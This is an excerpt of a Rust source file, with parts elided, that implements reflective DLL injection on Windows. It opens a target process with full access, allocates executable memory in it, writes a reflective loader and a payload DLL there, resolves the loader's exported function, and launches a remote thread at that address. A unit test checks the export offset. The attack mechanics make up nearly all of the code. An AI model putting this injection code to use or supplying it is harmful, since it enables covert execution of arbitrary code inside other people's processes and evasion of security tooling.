use std::io;
use std::{os::raw::c_void, ptr::null_mut, mem::size_of};
use std::ffi::CStr;
...
use windows_sys::Win32::{System::{SystemServices::{IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory, IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT}, Threading::{OpenProcess, PROCESS_ALL_ACCESS, PROCESS_ACCESS_RIGHTS}, Memory::{VirtualAllocEx, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}, Foundation::{GetLastError, BOOL, HANDLE, FALSE}};
...
fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32) -> anyhow::Result<()>{
    ...
    let remote_buffer = virtual_alloc_ex(process_handle, null_mut(), image_size as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)?;
    let _loader_bytes_written = write_process_memory(process_handle, remote_buffer as _, reflective_loader_dll.as_ptr() as _, image_size as usize)?;

    println!("target_dll_bytes: {:?}", target_dll_bytes.as_slice().as_ptr());
    println!("Hit me!");
    let stdin_handle = io::stdin();
    let mut tmp_string = String::new();
    let _ = stdin_handle.read_line(&mut tmp_string).unwrap();

    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(process_handle, null_mut(), target_dll_bytes.len() as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)?;
    let _payload_bytes_written = write_process_memory(process_handle, remote_buffer_target_dll as _, target_dll_bytes.as_slice().as_ptr() as _, target_dll_bytes.len() as usize)?;
    ...
    let loader_address_offset = get_export_address_by_name(reflective_loader_dll, loader_function_name)?;
    println!("{:#08x}", loader_address_offset);
    let loader_address = loader_address_offset + remote_buffer as usize;
    println!("{:#08x}", loader_address);
    ...
    let _thread_handle = unsafe { 
        ...
        null_mut(),
        0,
        Some(std::mem::transmute(loader_address as usize)),
...
mod tests {
    ...
    fn test_dll_reflect_lookup_export() -> anyhow::Result<()> {
        ...
        assert_eq!(loader_address_offset, 0x432);
        Ok(())
    }
